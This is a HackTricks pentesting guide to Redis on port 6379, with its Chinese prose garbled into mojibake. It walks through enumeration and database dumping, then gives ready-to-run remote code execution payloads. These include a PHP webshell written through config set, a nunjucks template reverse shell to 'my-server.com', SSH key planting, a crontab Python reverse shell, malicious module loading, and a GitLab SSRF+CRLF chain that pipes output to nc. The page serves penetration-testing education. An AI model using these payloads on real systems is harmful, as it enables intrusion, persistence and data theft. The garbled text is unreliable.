# 6379 - Pentesting Redis

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

<figure><img src="../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

åŠ å…¥ [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) æœåŠ¡å™¨ï¼Œä¸ç»éªŒä¸°å¯Œçš„é»‘å®¢å’Œæ¼æ´èµé‡‘çŒäººäº¤æµï¼

**é»‘å®¢è§è§£**\
å‚ä¸æ·±å…¥æ¢è®¨é»‘å®¢çš„åˆºæ¿€ä¸æŒ‘æˆ˜çš„å†…å®¹

**å®æ—¶é»‘å®¢æ–°é—»**\
é€šè¿‡å®æ—¶æ–°é—»å’Œè§è§£ï¼Œè·Ÿä¸Šå¿«é€Ÿå˜åŒ–çš„é»‘å®¢ä¸–ç•Œ

**æœ€æ–°å…¬å‘Š**\
äº†è§£æœ€æ–°çš„æ¼æ´èµé‡‘è®¡åˆ’å’Œé‡è¦å¹³å°æ›´æ–°

**ä»Šå¤©å°±åŠ å…¥æˆ‘ä»¬çš„** [**Discord**](https://discord.com/invite/N3FrSbmwdy)ï¼Œä¸é¡¶å°–é»‘å®¢å¼€å§‹åˆä½œå§ï¼

## åŸºæœ¬ä¿¡æ¯

æ¥è‡ª [æ–‡æ¡£](https://redis.io/topics/introduction)ï¼šRedis æ˜¯ä¸€ä¸ªå¼€æºï¼ˆBSD è®¸å¯ï¼‰ï¼Œå†…å­˜ä¸­çš„ **æ•°æ®ç»“æ„å­˜å‚¨**ï¼Œç”¨ä½œ **æ•°æ®åº“**ã€ç¼“å­˜å’Œæ¶ˆæ¯ä»£ç†ã€‚

é»˜è®¤æƒ…å†µä¸‹ï¼ŒRedis ä½¿ç”¨åŸºäºçº¯æ–‡æœ¬çš„åè®®ï¼Œä½†æ‚¨å¿…é¡»è®°ä½ï¼Œå®ƒä¹Ÿå¯ä»¥å®ç° **ssl/tls**ã€‚äº†è§£å¦‚ä½• [åœ¨è¿™é‡Œè¿è¡Œå¸¦æœ‰ ssl/tls çš„ Redis](https://fossies.org/linux/redis/TLS.md)ã€‚

**é»˜è®¤ç«¯å£ï¼š** 6379
```
PORT     STATE SERVICE  VERSION
6379/tcp open  redis   Redis key-value store 4.0.9
```
## è‡ªåŠ¨æšä¸¾

ä¸€äº›å¯ä»¥å¸®åŠ©ä» Redis å®ä¾‹è·å–ä¿¡æ¯çš„è‡ªåŠ¨åŒ–å·¥å…·ï¼š
```bash
nmap --script redis-info -sV -p 6379 <IP>
msf> use auxiliary/scanner/redis/redis_server
```
## æ‰‹åŠ¨æšä¸¾

### æ¨ªå¹…

Redis æ˜¯ä¸€ä¸ª **åŸºäºæ–‡æœ¬çš„åè®®**ï¼Œä½ å¯ä»¥ç›´æ¥ **åœ¨å¥—æ¥å­—ä¸­å‘é€å‘½ä»¤**ï¼Œè¿”å›çš„å€¼å°†æ˜¯å¯è¯»çš„ã€‚è¿˜è¦è®°ä½ï¼ŒRedis å¯ä»¥ä½¿ç”¨ **ssl/tls** è¿è¡Œï¼ˆä½†è¿™å¾ˆå¥‡æ€ªï¼‰ã€‚

åœ¨ä¸€ä¸ªå¸¸è§„çš„ Redis å®ä¾‹ä¸­ï¼Œä½ å¯ä»¥ç›´æ¥ä½¿ç”¨ `nc` è¿æ¥ï¼Œæˆ–è€…ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨ `redis-cli`ï¼š
```bash
nc -vn 10.10.10.10 6379
redis-cli -h 10.10.10.10 # sudo apt-get install redis-tools
```
æ‚¨å¯ä»¥å°è¯•çš„**ç¬¬ä¸€ä¸ªå‘½ä»¤**æ˜¯**`info`**ã€‚å®ƒ**å¯èƒ½è¿”å›åŒ…å«**Rediså®ä¾‹**ä¿¡æ¯çš„è¾“å‡º**ï¼Œ**æˆ–è€…è¿”å›ç±»ä¼¼ä»¥ä¸‹å†…å®¹**ï¼š
```
-NOAUTH Authentication required.
```
åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œè¿™æ„å‘³ç€**æ‚¨éœ€è¦æœ‰æ•ˆçš„å‡­æ®**æ‰èƒ½è®¿é—®Rediså®ä¾‹ã€‚

### Redisèº«ä»½éªŒè¯

**é»˜è®¤æƒ…å†µä¸‹**ï¼ŒRediså¯ä»¥**ä¸éœ€è¦å‡­æ®**è¿›è¡Œè®¿é—®ã€‚ç„¶è€Œï¼Œå®ƒå¯ä»¥è¢«**é…ç½®**ä¸ºä»…æ”¯æŒ**å¯†ç æˆ–ç”¨æˆ·å + å¯†ç **ã€‚\
å¯ä»¥åœ¨_**redis.conf**_æ–‡ä»¶ä¸­ä½¿ç”¨å‚æ•°`requirepass`**è®¾ç½®å¯†ç **ï¼Œ**æˆ–ä¸´æ—¶**ï¼Œç›´åˆ°æœåŠ¡é‡å¯ï¼Œè¿æ¥åˆ°å®ƒå¹¶è¿è¡Œï¼š`config set requirepass p@ss$12E45`ã€‚\
æ­¤å¤–ï¼Œå¯ä»¥åœ¨_**redis.conf**_æ–‡ä»¶ä¸­çš„å‚æ•°`masteruser`ä¸­é…ç½®**ç”¨æˆ·å**ã€‚

{% hint style="info" %}
å¦‚æœä»…é…ç½®äº†å¯†ç ï¼Œåˆ™ä½¿ç”¨çš„ç”¨æˆ·åæ˜¯"**default**"ã€‚\
å¦å¤–ï¼Œè¯·æ³¨æ„**æ— æ³•ä»å¤–éƒ¨æ‰¾åˆ°**Redisæ˜¯å¦ä»…é…ç½®äº†å¯†ç æˆ–ç”¨æˆ·å+å¯†ç ã€‚
{% endhint %}

åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ‚¨å°†**éœ€è¦æ‰¾åˆ°æœ‰æ•ˆçš„å‡­æ®**ä»¥ä¸Redisè¿›è¡Œäº¤äº’ï¼Œå› æ­¤æ‚¨å¯ä»¥å°è¯•[**æš´åŠ›ç ´è§£**](../generic-methodologies-and-resources/brute-force.md#redis)ã€‚\
**å¦‚æœæ‚¨æ‰¾åˆ°äº†æœ‰æ•ˆçš„å‡­æ®ï¼Œæ‚¨éœ€è¦åœ¨å»ºç«‹è¿æ¥åä½¿ç”¨ä»¥ä¸‹å‘½ä»¤è¿›è¡Œèº«ä»½éªŒè¯**ï¼š
```bash
AUTH <username> <password>
```
**æœ‰æ•ˆå‡­æ®**å°†ä¼šè¿”å›ï¼š `+OK`

### **è®¤è¯æšä¸¾**

å¦‚æœRedisæœåŠ¡å™¨å…è®¸**åŒ¿åè¿æ¥**æˆ–æ‚¨å·²è·å¾—æœ‰æ•ˆå‡­æ®ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹**å‘½ä»¤**å¯åŠ¨æœåŠ¡çš„æšä¸¾è¿‡ç¨‹ï¼š
```bash
INFO
[ ... Redis response with info ... ]
client list
[ ... Redis response with connected clients ... ]
CONFIG GET *
[ ... Get config ... ]
```
**å…¶ä»– Redis å‘½ä»¤** [**å¯ä»¥åœ¨è¿™é‡Œæ‰¾åˆ°**](https://redis.io/topics/data-types-intro) **å’Œ** [**è¿™é‡Œ**](https://lzone.de/cheat-sheet/Redis)**.**

è¯·æ³¨æ„ï¼Œ**å®ä¾‹çš„ Redis å‘½ä»¤å¯ä»¥åœ¨ _redis.conf_ æ–‡ä»¶ä¸­é‡å‘½åæˆ–åˆ é™¤**ã€‚ä¾‹å¦‚ï¼Œè¿™ä¸€è¡Œå°†åˆ é™¤å‘½ä»¤ FLUSHDB:
```
rename-command FLUSHDB ""
```
æœ‰å…³å®‰å…¨é…ç½®RedisæœåŠ¡çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·è®¿é—®ï¼š[https://www.digitalocean.com/community/tutorials/how-to-install-and-secure-redis-on-ubuntu-18-04](https://www.digitalocean.com/community/tutorials/how-to-install-and-secure-redis-on-ubuntu-18-04)

æ‚¨è¿˜å¯ä»¥ä½¿ç”¨å‘½ä»¤**`monitor`**å®æ—¶**ç›‘æ§æ‰§è¡Œçš„Rediså‘½ä»¤**ï¼Œæˆ–ä½¿ç”¨**`slowlog get 25`**è·å–**25ä¸ªæœ€æ…¢çš„æŸ¥è¯¢**ã€‚

åœ¨è¿™é‡Œæ‰¾åˆ°æ›´å¤šæœ‰è¶£çš„Rediså‘½ä»¤ä¿¡æ¯ï¼š[https://lzone.de/cheat-sheet/Redis](https://lzone.de/cheat-sheet/Redis)

### **è½¬å‚¨æ•°æ®åº“**

åœ¨Redisä¸­ï¼Œ**æ•°æ®åº“æ˜¯ä»0å¼€å§‹çš„æ•°å­—**ã€‚æ‚¨å¯ä»¥åœ¨å‘½ä»¤`info`çš„â€œKeyspaceâ€éƒ¨åˆ†çš„è¾“å‡ºä¸­æ‰¾åˆ°æ˜¯å¦æœ‰äººåœ¨ä½¿ç”¨ï¼š

![](<../.gitbook/assets/image (766).png>)

æˆ–è€…æ‚¨å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼è·å–æ‰€æœ‰**é”®ç©ºé—´**ï¼ˆæ•°æ®åº“ï¼‰ï¼š
```
INFO keyspace
```
åœ¨è¯¥ç¤ºä¾‹ä¸­ï¼Œ**æ•°æ®åº“ 0 å’Œ 1** æ­£åœ¨ä½¿ç”¨ä¸­ã€‚**æ•°æ®åº“ 0 åŒ…å« 4 ä¸ªé”®ï¼Œæ•°æ®åº“ 1 åŒ…å« 1 ä¸ª**ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ŒRedis å°†ä½¿ç”¨æ•°æ®åº“ 0ã€‚ä¸ºäº†å¯¼å‡ºä¾‹å¦‚æ•°æ®åº“ 1ï¼Œæ‚¨éœ€è¦æ‰§è¡Œï¼š
```bash
SELECT 1
[ ... Indicate the database ... ]
KEYS *
[ ... Get Keys ... ]
GET <KEY>
[ ... Get Key ... ]
```
åœ¨è¿è¡Œ `GET <KEY>` æ—¶ï¼Œå¦‚æœå‡ºç°ä»¥ä¸‹é”™è¯¯ `-WRONGTYPE Operation against a key holding the wrong kind of value`ï¼Œè¿™å¯èƒ½æ˜¯å› ä¸ºè¯¥é”®çš„ç±»å‹ä¸æ˜¯å­—ç¬¦ä¸²æˆ–æ•´æ•°ï¼Œéœ€è¦ä½¿ç”¨ç‰¹æ®Šæ“ä½œç¬¦æ¥æ˜¾ç¤ºå®ƒã€‚

è¦çŸ¥é“é”®çš„ç±»å‹ï¼Œè¯·ä½¿ç”¨ `TYPE` å‘½ä»¤ï¼Œä¸‹é¢æ˜¯åˆ—è¡¨å’Œå“ˆå¸Œé”®çš„ç¤ºä¾‹ã€‚
```bash
TYPE <KEY>
[ ... Type of the Key ... ]
LRANGE <KEY> 0 -1
[ ... Get list items ... ]
HGET <KEY> <FIELD>
[ ... Get hash item ... ]

# If the type used is weird you can always do:
DUMP <key>
```
**ä½¿ç”¨ npm å¯¼å‡ºæ•°æ®åº“**[ **redis-dump**](https://www.npmjs.com/package/redis-dump) **æˆ– python** [**redis-utils**](https://pypi.org/project/redis-utils/)

<figure><img src="../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

åŠ å…¥ [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) æœåŠ¡å™¨ï¼Œä¸ç»éªŒä¸°å¯Œçš„é»‘å®¢å’Œæ¼æ´èµé‡‘çŒäººäº¤æµï¼

**é»‘å®¢è§è§£**\
å‚ä¸æ·±å…¥æ¢è®¨é»‘å®¢çš„åˆºæ¿€ä¸æŒ‘æˆ˜çš„å†…å®¹

**å®æ—¶é»‘å®¢æ–°é—»**\
é€šè¿‡å®æ—¶æ–°é—»å’Œè§è§£ï¼Œè·Ÿä¸Šå¿«é€Ÿå˜åŒ–çš„é»‘å®¢ä¸–ç•Œ

**æœ€æ–°å…¬å‘Š**\
äº†è§£æœ€æ–°çš„æ¼æ´èµé‡‘è®¡åˆ’å’Œé‡è¦å¹³å°æ›´æ–°

**ä»Šå¤©å°±åŠ å…¥æˆ‘ä»¬** [**Discord**](https://discord.com/invite/N3FrSbmwdy)ï¼Œä¸é¡¶å°–é»‘å®¢å¼€å§‹åˆä½œï¼

## Redis RCE

### äº¤äº’å¼ Shell

[**redis-rogue-server**](https://github.com/n0b0dyCN/redis-rogue-server) å¯ä»¥åœ¨ Redis(<=5.0.5) ä¸­è‡ªåŠ¨è·å–äº¤äº’å¼ shell æˆ–åå‘ shellã€‚
```
./redis-rogue-server.py --rhost <TARGET_IP> --lhost <ACCACKER_IP>
```
### PHP Webshell

æ¥è‡ª[**è¿™é‡Œ**](https://web.archive.org/web/20191201022931/http://reverse-tcp.xyz/pentest/database/2017/02/09/Redis-Hacking-Tips.html)çš„ä¿¡æ¯ã€‚ä½ å¿…é¡»çŸ¥é“**ç½‘ç«™æ–‡ä»¶å¤¹**çš„**è·¯å¾„**ï¼š
```
root@Urahara:~# redis-cli -h 10.85.0.52
10.85.0.52:6379> config set dir /usr/share/nginx/html
OK
10.85.0.52:6379> config set dbfilename redis.php
OK
10.85.0.52:6379> set test "<?php phpinfo(); ?>"
OK
10.85.0.52:6379> save
OK
```
â€‹å¦‚æœ webshell è®¿é—®å¼‚å¸¸ï¼Œæ‚¨å¯ä»¥åœ¨å¤‡ä»½åæ¸…ç©ºæ•°æ®åº“å¹¶é‡è¯•ï¼Œè®°å¾—æ¢å¤æ•°æ®åº“ã€‚

### æ¨¡æ¿ Webshell

ä¸å‰ä¸€èŠ‚ä¸€æ ·ï¼Œæ‚¨è¿˜å¯ä»¥è¦†ç›–ä¸€äº›å°†è¢«æ¨¡æ¿å¼•æ“è§£é‡Šçš„ html æ¨¡æ¿æ–‡ä»¶ï¼Œä»è€Œè·å¾— shellã€‚

ä¾‹å¦‚ï¼ŒæŒ‰ç…§ [**è¿™ç¯‡æ–‡ç« **](https://www.neteye-blog.com/2022/05/cyber-apocalypse-ctf-2022-red-island-writeup/)ï¼Œæ‚¨å¯ä»¥çœ‹åˆ°æ”»å‡»è€…åœ¨ **nunjucks æ¨¡æ¿å¼•æ“** è§£é‡Šçš„ **html** ä¸­æ³¨å…¥äº†ä¸€ä¸ª **rev shellï¼š**
```javascript
{{ ({}).constructor.constructor(
"var net = global.process.mainModule.require('net'),
cp = global.process.mainModule.require('child_process'),
sh = cp.spawn('sh', []);
var client = new net.Socket();
client.connect(1234, 'my-server.com', function(){
client.pipe(sh.stdin);
sh.stdout.pipe(client);
sh.stderr.pipe(client);
});"
)()}}
```
{% hint style="warning" %}
æ³¨æ„ **å¤šä¸ªæ¨¡æ¿å¼•æ“ä¼šå°†** æ¨¡æ¿ç¼“å­˜åˆ° **å†…å­˜ä¸­**ï¼Œå› æ­¤å³ä½¿ä½ è¦†ç›–äº†å®ƒä»¬ï¼Œæ–°çš„æ¨¡æ¿ä¹Ÿ **ä¸ä¼šè¢«æ‰§è¡Œ**ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œè¦ä¹ˆå¼€å‘è€…ä¿æŒäº†è‡ªåŠ¨é‡è½½çš„çŠ¶æ€ï¼Œè¦ä¹ˆä½ éœ€è¦å¯¹æœåŠ¡è¿›è¡Œ DoS æ”»å‡»ï¼ˆå¹¶æœŸæœ›å®ƒä¼šè‡ªåŠ¨é‡æ–°å¯åŠ¨ï¼‰ã€‚
{% endhint %}

### SSH

ç¤ºä¾‹ [æ¥è‡ªè¿™é‡Œ](https://blog.adithyanak.com/oscp-preparation-guide/enumeration)

è¯·æ³¨æ„ **`config get dir`** çš„ç»“æœå¯èƒ½ä¼šåœ¨å…¶ä»–æ‰‹åŠ¨åˆ©ç”¨å‘½ä»¤åå‘ç”Ÿå˜åŒ–ã€‚å»ºè®®åœ¨ç™»å½• Redis åç«‹å³è¿è¡Œå®ƒã€‚åœ¨ **`config get dir`** çš„è¾“å‡ºä¸­ï¼Œä½ å¯ä»¥æ‰¾åˆ° **redis ç”¨æˆ·** çš„ **å®¶ç›®å½•**ï¼ˆé€šå¸¸æ˜¯ _/var/lib/redis_ æˆ– _/home/redis/.ssh_ï¼‰ï¼ŒçŸ¥é“è¿™ä¸€ç‚¹åï¼Œä½ å°±çŸ¥é“å¯ä»¥åœ¨å“ªé‡Œå†™å…¥ `authenticated_users` æ–‡ä»¶ä»¥é€šè¿‡ ssh **ä»¥ redis ç”¨æˆ·èº«ä»½** è®¿é—®ã€‚å¦‚æœä½ çŸ¥é“å…¶ä»–æœ‰æ•ˆç”¨æˆ·çš„å®¶ç›®å½•å¹¶ä¸”ä½ æœ‰å¯å†™æƒé™ï¼Œä½ ä¹Ÿå¯ä»¥åˆ©ç”¨å®ƒï¼š

1. åœ¨ä½ çš„ç”µè„‘ä¸Šç”Ÿæˆä¸€ä¸ª ssh å…¬ç§é’¥å¯¹ï¼š**`ssh-keygen -t rsa`**
2. å°†å…¬é’¥å†™å…¥æ–‡ä»¶ï¼š**`(echo -e "\n\n"; cat ~/id_rsa.pub; echo -e "\n\n") > spaced_key.txt`**
3. å°†æ–‡ä»¶å¯¼å…¥ redisï¼š**`cat spaced_key.txt | redis-cli -h 10.85.0.52 -x set ssh_key`**
4. å°†å…¬é’¥ä¿å­˜åˆ° redis æœåŠ¡å™¨ä¸Šçš„ **authorized\_keys** æ–‡ä»¶ä¸­ï¼š

```
root@Urahara:~# redis-cli -h 10.85.0.52
10.85.0.52:6379> config set dir /var/lib/redis/.ssh
OK
10.85.0.52:6379> config set dbfilename "authorized_keys"
OK
10.85.0.52:6379> save
OK
```
5. æœ€åï¼Œä½ å¯ä»¥ä½¿ç”¨ç§é’¥ **ssh** è¿æ¥åˆ° **redis æœåŠ¡å™¨**ï¼š**ssh -i id\_rsa redis@10.85.0.52**

**æ­¤æŠ€æœ¯åœ¨è¿™é‡Œè‡ªåŠ¨åŒ–ï¼š** [https://github.com/Avinash-acid/Redis-Server-Exploit](https://github.com/Avinash-acid/Redis-Server-Exploit)

### Crontab
```
root@Urahara:~# echo -e "\n\n*/1 * * * * /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.85.0.53\",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n\n"|redis-cli -h 10.85.0.52 -x set 1
OK
root@Urahara:~# redis-cli -h 10.85.0.52 config set dir /var/spool/cron/crontabs/
OK
root@Urahara:~# redis-cli -h 10.85.0.52 config set dbfilename root
OK
root@Urahara:~# redis-cli -h 10.85.0.52 save
OK
```
æœ€åä¸€ä¸ªç¤ºä¾‹é€‚ç”¨äº Ubuntuï¼Œå¯¹äº **Centos**ï¼Œä¸Šè¿°å‘½ä»¤åº”ä¸ºï¼š`redis-cli -h 10.85.0.52 config set dir /var/spool/cron/`

æ­¤æ–¹æ³•ä¹Ÿå¯ä»¥ç”¨æ¥èµšå–æ¯”ç‰¹å¸ï¼š[yam](https://www.v2ex.com/t/286981#reply14)

### åŠ è½½ Redis æ¨¡å—

1. æŒ‰ç…§ [https://github.com/n0b0dyCN/RedisModules-ExecuteCommand](https://github.com/n0b0dyCN/RedisModules-ExecuteCommand) çš„è¯´æ˜ï¼Œæ‚¨å¯ä»¥ **ç¼–è¯‘ä¸€ä¸ª redis æ¨¡å—ä»¥æ‰§è¡Œä»»æ„å‘½ä»¤**ã€‚
2. ç„¶åæ‚¨éœ€è¦æŸç§æ–¹å¼æ¥ **ä¸Šä¼ ç¼–è¯‘å¥½çš„** æ¨¡å—ã€‚
3. **åœ¨è¿è¡Œæ—¶åŠ è½½ä¸Šä¼ çš„æ¨¡å—**ï¼Œä½¿ç”¨ `MODULE LOAD /path/to/mymodule.so`
4. **åˆ—å‡ºå·²åŠ è½½çš„æ¨¡å—**ï¼Œä»¥æ£€æŸ¥æ˜¯å¦æ­£ç¡®åŠ è½½ï¼š`MODULE LIST`
5. **æ‰§è¡Œ** **å‘½ä»¤**ï¼š

```
127.0.0.1:6379> system.exec "id"
"uid=0(root) gid=0(root) groups=0(root)\n"
127.0.0.1:6379> system.exec "whoami"
"root\n"
127.0.0.1:6379> system.rev 127.0.0.1 9999
```
6. éšæ—¶å¸è½½æ¨¡å—ï¼š`MODULE UNLOAD mymodule`

### LUA æ²™ç®±ç»•è¿‡

[**è¿™é‡Œ**](https://www.agarri.fr/blog/archives/2014/09/11/trying\_to\_hack\_redis\_via\_http\_requests/index.html) æ‚¨å¯ä»¥çœ‹åˆ° Redis ä½¿ç”¨å‘½ä»¤ **EVAL** æ¥æ‰§è¡Œ **æ²™ç®±ä¸­çš„ Lua ä»£ç **ã€‚åœ¨é“¾æ¥çš„å¸–å­ä¸­ï¼Œæ‚¨å¯ä»¥çœ‹åˆ° **å¦‚ä½•æ»¥ç”¨å®ƒ** ä½¿ç”¨ **dofile** å‡½æ•°ï¼Œä½† [æ˜¾ç„¶](https://stackoverflow.com/questions/43502696/redis-cli-code-execution-using-eval) è¿™ä¸å†å¯èƒ½ã€‚æ— è®ºå¦‚ä½•ï¼Œå¦‚æœæ‚¨å¯ä»¥ **ç»•è¿‡ Lua** æ²™ç®±ï¼Œæ‚¨å¯ä»¥ **åœ¨ç³»ç»Ÿä¸Šæ‰§è¡Œä»»æ„** å‘½ä»¤ã€‚æ­¤å¤–ï¼Œä»åŒä¸€å¸–å­ä¸­ï¼Œæ‚¨å¯ä»¥çœ‹åˆ°ä¸€äº› **å¯¼è‡´ DoS çš„é€‰é¡¹**ã€‚

ä¸€äº› **CVE ç”¨äºé€ƒç¦» LUA**ï¼š

* [https://github.com/aodsec/CVE-2022-0543](https://github.com/aodsec/CVE-2022-0543)

### ä¸»ä»æ¨¡å—

ä¸» Redis çš„æ‰€æœ‰æ“ä½œä¼šè‡ªåŠ¨åŒæ­¥åˆ°ä» Redisï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥å°†æ¼æ´ Redis è§†ä¸ºä» Redisï¼Œè¿æ¥åˆ°æˆ‘ä»¬è‡ªå·±æ§åˆ¶çš„ä¸» Redisï¼Œç„¶åæˆ‘ä»¬å¯ä»¥å‘è‡ªå·±çš„ Redis è¾“å…¥å‘½ä»¤ã€‚
```
master redis : 10.85.0.51 (Hacker's Server)
slave  redis : 10.85.0.52 (Target Vulnerability Server)
A master-slave connection will be established from the slave redis and the master redis:
redis-cli -h 10.85.0.52 -p 6379
slaveof 10.85.0.51 6379
Then you can login to the master redis to control the slave redis:
redis-cli -h 10.85.0.51 -p 6379
set mykey hello
set mykey2 helloworld
```
## SSRF ä¸ Redis é€šä¿¡

å¦‚æœæ‚¨å¯ä»¥å‘é€ **æ˜æ–‡** è¯·æ±‚ **åˆ° Redis**ï¼Œæ‚¨å¯ä»¥ **ä¸å…¶é€šä¿¡**ï¼Œå› ä¸º Redis ä¼šé€è¡Œè¯»å–è¯·æ±‚ï¼Œå¹¶ä»…å¯¹å®ƒä¸ç†è§£çš„è¡Œè¿”å›é”™è¯¯ï¼š
```
-ERR wrong number of arguments for 'get' command
-ERR unknown command 'Host:'
-ERR unknown command 'Accept:'
-ERR unknown command 'Accept-Encoding:'
-ERR unknown command 'Via:'
-ERR unknown command 'Cache-Control:'
-ERR unknown command 'Connection:'
```
å› æ­¤ï¼Œå¦‚æœæ‚¨åœ¨ç½‘ç«™ä¸­å‘ç°äº†ä¸€ä¸ª **SSRF vuln**ï¼Œå¹¶ä¸”æ‚¨å¯ä»¥ **æ§åˆ¶** ä¸€äº› **headers**ï¼ˆå¯èƒ½é€šè¿‡ CRLF vulnï¼‰æˆ– **POST å‚æ•°**ï¼Œæ‚¨å°†èƒ½å¤Ÿå‘ Redis å‘é€ä»»æ„å‘½ä»¤ã€‚

### ç¤ºä¾‹ï¼šGitlab SSRF + CRLF åˆ° Shell

åœ¨ **Gitlab11.4.7** ä¸­å‘ç°äº†ä¸€ä¸ª **SSRF** æ¼æ´å’Œä¸€ä¸ª **CRLF**ã€‚è¯¥ **SSRF** æ¼æ´å­˜åœ¨äº **ä» URL å¯¼å…¥é¡¹ç›®åŠŸèƒ½** ä¸­ï¼Œåœ¨åˆ›å»ºæ–°é¡¹ç›®æ—¶å…è®¸ä»¥ \[0:0:0:0:0:ffff:127.0.0.1] çš„å½¢å¼è®¿é—®ä»»æ„ IPï¼ˆè¿™å°†è®¿é—® 127.0.0.1ï¼‰ï¼Œè€Œ **CRLF** æ¼æ´åˆ™é€šè¿‡åœ¨ **URL** ä¸­æ·»åŠ  **%0D%0A** å­—ç¬¦æ¥åˆ©ç”¨ã€‚

å› æ­¤ï¼Œå¯ä»¥ **åˆ©ç”¨è¿™äº›æ¼æ´ä¸ç®¡ç†æ¥è‡ª gitlab çš„é˜Ÿåˆ—çš„ Redis å®ä¾‹è¿›è¡Œé€šä¿¡**ï¼Œå¹¶åˆ©ç”¨è¿™äº›é˜Ÿåˆ— **è·å¾—ä»£ç æ‰§è¡Œ**ã€‚Redis é˜Ÿåˆ—æ»¥ç”¨æœ‰æ•ˆè½½è·æ˜¯ï¼š
```
multi
sadd resque:gitlab:queues system_hook_push
lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open(\'|whoami | nc 192.241.233.143 80\').read\"],\"retry\":3,\"queue\":\"system_hook_push\",\"jid\":\"ad52abc5641173e217eb2e52\",\"created_at\":1513714403.8122594,\"enqueued_at\":1513714403.8129568}"
exec
```
å¹¶ä¸”**URLç¼–ç **è¯·æ±‚**æ»¥ç”¨SSRF**å’Œ**CRLF**æ¥æ‰§è¡Œ`whoami`å¹¶é€šè¿‡`nc`å‘é€å›è¾“å‡ºçš„å†…å®¹æ˜¯ï¼š
```
git://[0:0:0:0:0:ffff:127.0.0.1]:6379/%0D%0A%20multi%0D%0A%20sadd%20resque%3Agitlab%3Aqueues%20system%5Fhook%5Fpush%0D%0A%20lpush%20resque%3Agitlab%3Aqueue%3Asystem%5Fhook%5Fpush%20%22%7B%5C%22class%5C%22%3A%5C%22GitlabShellWorker%5C%22%2C%5C%22args%5C%22%3A%5B%5C%22class%5Feval%5C%22%2C%5C%22open%28%5C%27%7Ccat%20%2Fflag%20%7C%20nc%20127%2E0%2E0%2E1%202222%5C%27%29%2Eread%5C%22%5D%2C%5C%22retry%5C%22%3A3%2C%5C%22queue%5C%22%3A%5C%22system%5Fhook%5Fpush%5C%22%2C%5C%22jid%5C%22%3A%5C%22ad52abc5641173e217eb2e52%5C%22%2C%5C%22created%5Fat%5C%22%3A1513714403%2E8122594%2C%5C%22enqueued%5Fat%5C%22%3A1513714403%2E8129568%7D%22%0D%0A%20exec%0D%0A%20exec%0D%0A/ssrf123321.git
```
_å‡ºäºæŸç§åŸå› ï¼ˆæ­£å¦‚_ [_https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/_](https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/) _çš„ä½œè€…æ‰€è¿°ï¼‰åˆ©ç”¨`git`æ–¹æ¡ˆè€Œä¸æ˜¯`http`æ–¹æ¡ˆæˆåŠŸã€‚_

<figure><img src="../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

åŠ å…¥ [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) æœåŠ¡å™¨ï¼Œä¸ç»éªŒä¸°å¯Œçš„é»‘å®¢å’Œæ¼æ´èµé‡‘çŒäººäº¤æµï¼

**é»‘å®¢è§è§£**\
å‚ä¸æ·±å…¥æ¢è®¨é»‘å®¢çš„åˆºæ¿€ä¸æŒ‘æˆ˜çš„å†…å®¹

**å®æ—¶é»‘å®¢æ–°é—»**\
é€šè¿‡å®æ—¶æ–°é—»å’Œè§è§£ï¼Œè·Ÿä¸Šå¿«é€Ÿå˜åŒ–çš„é»‘å®¢ä¸–ç•Œ

**æœ€æ–°å…¬å‘Š**\
äº†è§£æœ€æ–°çš„æ¼æ´èµé‡‘è®¡åˆ’å’Œé‡è¦å¹³å°æ›´æ–°

**ä»Šå¤©å°±åŠ å…¥æˆ‘ä»¬çš„** [**Discord**](https://discord.com/invite/N3FrSbmwdy)ï¼Œä¸é¡¶å°–é»‘å®¢å¼€å§‹åˆä½œï¼

{% hint style="success" %}
